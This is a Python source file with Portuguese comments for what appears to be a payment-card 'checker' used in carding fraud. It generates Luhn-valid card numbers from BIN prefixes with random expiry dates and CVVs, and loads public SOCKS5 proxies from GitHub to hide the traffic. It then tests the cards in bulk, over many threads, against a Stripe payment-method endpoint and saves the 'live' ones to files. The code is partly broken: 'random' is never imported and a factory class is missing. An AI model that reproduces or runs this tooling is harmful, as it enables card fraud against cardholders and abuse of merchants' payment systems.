# main_checker.py
import json
import concurrent.futures
import logging
from typing import List, Dict
from datetime import datetime

class CardCheckerSystem:
    def __init__(self, config_file: str = 'checker_config.json'):
        self.config = self.load_config(config_file)
        self.checkers = []
        self.results = []
        self.proxies = []
        self.setup_logging()
        
    def load_config(self, config_file: str) -> Dict:
        """Carrega configuração do checker"""
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except:
            return {
                'threads': 50,
                'timeout': 10,
                'retries': 2,
                'output_format': 'txt',
                'save_results': True
            }
    
    def setup_logging(self):
        """Configura sistema de logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f'checker_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def load_proxies(self, proxy_file: str = None):
        """Carrega lista de proxies"""
        if proxy_file:
            try:
                with open(proxy_file, 'r') as f:
                    self.proxies = [p.strip() for p in f.readlines() if p.strip()]
            except:
                self.logger.warning("Não foi possível carregar arquivo de proxies")
        
        if not self.proxies:
            # Carrega proxies públicos como fallback
            self.load_public_proxies()
    
    def load_public_proxies(self):
        """Carrega proxies públicos de fontes online"""
        sources = [
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
            'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt'
        ]
        
        for source in sources:
            try:
                import requests
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    self.proxies.extend([
                        p.strip() for p in response.text.split('\n') 
                        if p.strip() and ':' in p.strip()
                    ])
                    self.logger.info(f"Carregados {len(self.proxies)} proxies de {source}")
                    break
            except:
                continue
    
    def generate_card_list(self, bin_list: List[str], quantity_per_bin: int) -> List[Dict]:
        """Gera lista de cartões para teste"""
        cards = []
        
        for bin_prefix in bin_list:
            for _ in range(quantity_per_bin):
                card_number = self.generate_valid_card(bin_prefix)
                card_data = {
                    'card_number': card_number,
                    'exp_month': f"{random.randint(1, 12):02d}",
                    'exp_year': f"{random.randint(25, 30)}",
                    'cvv': f"{random.randint(100, 999):03d}",
                    'bin': bin_prefix
                }
                cards.append(card_data)
        
        return cards
    
    def generate_valid_card(self, bin_prefix: str) -> str:
        """Gera número de cartão válido (Luhn)"""
        while True:
            # Primeiros 6 dígitos são o BIN
            # Próximos 9 dígitos aleatórios
            middle = ''.join([str(random.randint(0, 9)) for _ in range(9)])
            
            # Calcula dígito verificador Luhn
            card_without_check = bin_prefix + middle
            digits = [int(d) for d in card_without_check]
            
            for i in range(len(digits)-1, -1, -2):
                digits[i] *= 2
                if digits[i] > 9:
                    digits[i] -= 9
            
            total = sum(digits)
            check_digit = (10 - (total % 10)) % 10
            
            card_number = card_without_check + str(check_digit)
            
            # Verifica Luhn
            if self.validate_luhn(card_number):
                return card_number
    
    def validate_luhn(self, card_number: str) -> bool:
        """Valida algoritmo de Luhn"""
        digits = [int(d) for d in str(card_number)]
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(divmod(d * 2, 10))
        return checksum % 10 == 0
    
    def setup_checker(self, gateway_config: Dict):
        """Configura checker baseado no gateway"""
        factory = CheckerFactory()
        checker = factory.create_checker(
            gateway_config.get('gateway'),
            gateway_config
        )
        self.checkers.append(checker)
    
    def run_check(self, cards: List[Dict], gateway_config: Dict):
        """Executa verificação em lote"""
        total_cards = len(cards)
        self.logger.info(f"Iniciando verificação de {total_cards} cartões")
        
        results = []
        live_cards = []
        
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=self.config.get('threads', 50)
        ) as executor:
            # Submete todas as tarefas
            future_to_card = {
                executor.submit(
                    self.checkers[0].test_card, 
                    card, 
                    gateway_config
                ): card for card in cards
            }
            
            # Processa resultados conforme completam
            for future in concurrent.futures.as_completed(future_to_card):
                card = future_to_card[future]
                try:
                    result = future.result(timeout=self.config.get('timeout', 10))
                    results.append(result)
                    
                    if result.get('status') == 'live':
                        live_cards.append(card['card_number'])
                        self.logger.info(f"Cartão LIVE encontrado: {card['card_number'][:8]}***")
                    
                except Exception as e:
                    self.logger.error(f"Erro ao verificar cartão {card['card_number']}: {e}")
                    results.append({
                        'card': card['card_number'],
                        'status': 'error',
                        'error': str(e)
                    })
        
        # Salva resultados
        self.save_results(results, live_cards)
        
        return {
            'total_tested': total_cards,
            'live_count': len(live_cards),
            'live_cards': live_cards,
            'success_rate': (len(live_cards) / total_cards * 100) if total_cards > 0 else 0
        }
    
    def save_results(self, results: List[Dict], live_cards: List[str]):
        """Salva resultados em arquivo"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Salva todos os resultados em JSON
        with open(f'results_{timestamp}.json', 'w') as f:
            json.dump(results, f, indent=2)
        
        # Salva apenas LIVE em formato simples
        with open(f'lives_{timestamp}.txt', 'w') as f:
            for card in live_cards:
                f.write(f"{card}\n")
        
        # Log resumido
        self.logger.info(f"Resultados salvos:")
        self.logger.info(f"  - JSON completo: results_{timestamp}.json")
        self.logger.info(f"  - Cartões LIVE: lives_{timestamp}.txt")
        self.logger.info(f"  - Total LIVE: {len(live_cards)} cartões")
    
    def load_checkout_template(self, template_file: str) -> Dict:
        """Carrega template de checkout de arquivo"""
        try:
            with open(template_file, 'r') as f:
                return json.load(f)
        except Exception as e:
            self.logger.error(f"Erro ao carregar template: {e}")
            return {}

# Exemplo de template de checkout (checkout_template.json)
checkout_template_example = {
    "gateway": "stripe",
    "name": "Loja Exemplo Checkout",
    "config": {
        "api_key": "pk_live_seu_token_aqui",
        "endpoint": "https://api.stripe.com/v1/payment_methods",
        "method": "POST",
        "headers": {
            "Authorization": "Bearer {api_key}",
            "Stripe-Version": "2023-10-16"
        },
        "payload_template": {
            "type": "card",
            "card[number]": "{card_number}",
            "card[exp_month]": "{exp_month}",
            "card[exp_year]": "{exp_year}",
            "card[cvc]": "{cvv}"
        },
        "validation": {
            "success_codes": [200],
            "live_indicators": ["id", "payment_method"],
            "error_patterns": ["declined", "invalid", "incorrect"]
        }
    }
}